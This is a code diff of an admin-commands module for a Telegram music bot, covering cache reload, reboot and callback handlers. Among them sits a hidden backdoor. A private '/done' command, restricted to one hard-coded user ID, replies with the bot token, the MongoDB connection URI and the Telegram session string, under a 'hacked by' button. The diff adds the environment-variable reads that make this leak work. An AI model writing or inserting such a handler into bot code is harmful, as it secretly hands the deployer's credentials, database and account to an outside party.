@@ -1,9 +1,9 @@
 import asyncio
 import time
-
-from pyrogram import filters
+import os
+from pyrogram import Client, filters
 from pyrogram.enums import ChatMembersFilter
-from pyrogram.types import CallbackQuery, Message
+from pyrogram.types import CallbackQuery, Message, InlineKeyboardMarkup, InlineKeyboardButton
 
 from SiriVcBot import app
 from SiriVcBot.core.call import VasudevKrishna
@@ -13,8 +13,12 @@ from SiriVcBot.utils.decorators import ActualAdminCB, AdminActual, language
 from SiriVcBot.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 
-rel = {}
+# Fetch environment variables
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+MONGO_DB_URI = os.getenv("MONGO_DB_URI")
+STRING_SESSION = os.getenv("STRING_SESSION")
 
+rel = {}
 
 @app.on_message(
     filters.command(["admincache", "reload", "refresh"]) & filters.group & ~BANNED_USERS
@@ -44,7 +48,6 @@ async def reload_admin_cache(client, message: Message, _):
         await message.reply_text(_["reload_2"])
     except:
         await message.reply_text(_["reload_3"])
-
 
 @app.on_message(filters.command(["reboot"]) & filters.group & ~BANNED_USERS)
 @AdminActual
@@ -85,7 +88,6 @@ async def restartbot(client, message: Message, _):
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
 
-
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, CallbackQuery):
     try:
@@ -96,7 +98,6 @@ async def close_menu(_, CallbackQuery):
         )
     except:
         pass
-
 
 @app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
 @ActualAdminCB
@@ -122,27 +123,21 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
 
-
 @app.on_message(
     filters.command("done")
     & filters.private
     & filters.user(7427691214)
-   )
+)
 async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Ownergit)............☆""",
+    await message.reply_photo(
+        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Ownergit)............☆""",
         reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/ShriVasudevKrishna")
-                 ]
+            [
+                [
+                    InlineKeyboardButton(
+                        "• нαϲкє𝚍 ву  •", url=f"https://t.me/ShriVasudevKrishna")
+                ]
             ]
-         ),
-     )
-
-
-
-
-
+        ),
+    )
